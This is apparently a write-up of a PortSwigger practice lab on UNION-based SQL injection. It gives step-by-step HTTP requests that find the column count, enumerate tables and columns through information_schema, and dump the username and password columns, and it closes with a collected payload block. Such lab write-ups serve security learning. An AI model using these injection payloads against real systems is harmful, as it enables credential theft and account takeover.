# 📝 Lab: SQL injection attack, listing the database contents on non-Oracle databases

- **Vulnerability:** SQL Injection.
- **Difficulty:** PRACTITIONER.
- **Objective:** Log in as the administrator.

---

## 🛠️ Tools Used
- Browser (FoxyProxy)
- Burp Suite

---

## 🐾 Steps to Reproduce
1. Open the lab's main page, turn on the *FoxyProxy* extension, and click on any category (e.g., Pets).
2. Open **Burp Suite -> Proxy -> HTTP History**, find the request, and press `Ctrl+R` to send it to **Repeater**.
3. In Repeater, look at the request: `GET /filter?category=Gifts HTTP/2`. The `category` parameter is our vulnerable injection point.
4. First, we need to find out how many columns the original query uses by injecting an `ORDER BY` payload:
   `GET /filter?category=Gifts'+ORDER+BY+1-- ` 
   *(Note: If you get a 500 Internal Server Error, it's a common quirk in PostgreSQL where the database requires a space after the comment syntax. To fix this, just add a URL-encoded space `(--+)` or `(--%20)`).*
   Keep increasing the number (`ORDER BY 2`, `ORDER BY 3`). When `ORDER BY 3` causes an error, it means the table has exactly **2 columns**.
5. Next, we test the `UNION` payload and figure out the data types:
   `GET /filter?category=Gifts'+UNION+SELECT+NULL,NULL--+` (Returns 200 OK).
   Now, replace `NULL` with a string value like `'a'` to check if the columns accept text:
   `GET /filter?category=Gifts'+UNION+SELECT+'a','a'--+`
   Since it returns a **200 OK**, we know both columns can hold string data. Perfect!
6. Now, let's hunt for the table names. We can dump them using `information_schema.tables`:
   `GET /filter?category=Gifts'+UNION+SELECT+'a',table_name+FROM+information_schema.tables+WHERE+table_schema='public'--+`
   *(Tip: We use `table_schema='public'` to filter out default system tables and only show the tables created by the developers).*
7. Look at the response, and you will find a table named something like `users_XXXX` (the random characters change per session). Next, we need to find the exact column names inside that table:
   `GET /filter?category=Gifts'+UNION+SELECT+'a',column_name+FROM+information_schema.columns+WHERE+table_name='users_XXXX'--+`
8. The response will reveal the columns. You'll see `username_XXXX` and `password_XXXX`. Since our `UNION` payload only has room for 2 columns, this is exactly what we need!
9. Time to dump the credentials. Inject this payload to extract the usernames and passwords:
   `GET /filter?category=Gifts'+UNION+SELECT+username_XXXX,password_XXXX+FROM+users_XXXX--+`
10. Check the response in Repeater, scroll down, and grab the administrator's username and password.
11. Finally, go to the **My account** login page, enter the admin credentials, and boom! The **Lab Solved** banner will appear.

<img width="1917" height="906" alt="Screenshot 2026-09-15 224607" src="https://github.com/user-attachments/assets/6fd2b61f-0f4b-45b7-866e-ea1702642fe6" />

---

## 🎯 Impact
The impact of this vulnerability is critical. An attacker can dump all user credentials stored in the database, including the administrator's. This leads to massive Account Takeovers (ATO), exposure of sensitive personal data, and a complete system compromise.

---

## 💣 Payload
```sql
-- Finding columns & data types
'+ORDER+BY+1--+
'+UNION+SELECT+NULL,NULL--+
'+UNION+SELECT+'a','a'--+

-- Extracting table names
'+UNION+SELECT+'a',table_name+FROM+information_schema.tables+WHERE+table_schema='public'--+

-- Extracting column names (Replace users_XXXX with your target table)
'+UNION+SELECT+'a',column_name+FROM+information_schema.columns+WHERE+table_name='users_XXXX'--+

-- Dumping the data
'+UNION+SELECT+username_XXXX,password_XXXX+FROM+users_XXXX--+

```

## 🔗 Reference:
For more powerful payloads, check out the [PortSwigger SQLi Cheat Sheet.](https://portswigger.net/web-security/sql-injection/cheat-sheet)
